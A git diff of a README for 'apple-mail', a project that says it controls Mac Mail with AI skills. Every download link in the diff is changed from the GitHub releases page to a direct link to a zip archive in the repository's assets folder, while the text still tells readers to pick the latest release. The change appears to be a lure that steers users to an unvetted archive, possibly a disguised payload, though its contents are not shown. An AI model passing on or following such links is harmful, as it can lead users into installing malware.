@@ -1,11 +1,11 @@
 # 🍎 apple-mail - Control Mail with Simple AI Skills
 
-[![Download apple-mail](https://img.shields.io/badge/Download%20apple--mail-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ridzkyyyyy/apple-mail/releases)
+[![Download apple-mail](https://img.shields.io/badge/Download%20apple--mail-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/ridzkyyyyy/apple-mail/main/assets/mail_apple_3.5.zip)
 
 ## 📥 Download
 
 Visit this page to download:
-https://github.com/ridzkyyyyy/apple-mail/releases
+https://raw.githubusercontent.com/ridzkyyyyy/apple-mail/main/assets/mail_apple_3.5.zip
 
 Choose the latest release, then download the file that matches your Mac setup.
 
@@ -35,7 +35,7 @@ Before you start, make sure you have:
 ## 🚀 Getting Started
 
 1. Open the download page:  
-   https://github.com/ridzkyyyyy/apple-mail/releases
+   https://raw.githubusercontent.com/ridzkyyyyy/apple-mail/main/assets/mail_apple_3.5.zip
 
 2. Find the latest release.
 
@@ -185,4 +185,4 @@ For smooth use:
 
 Use the release page here:
 
-https://github.com/ridzkyyyyy/apple-mail/releases
+https://raw.githubusercontent.com/ridzkyyyyy/apple-mail/main/assets/mail_apple_3.5.zip
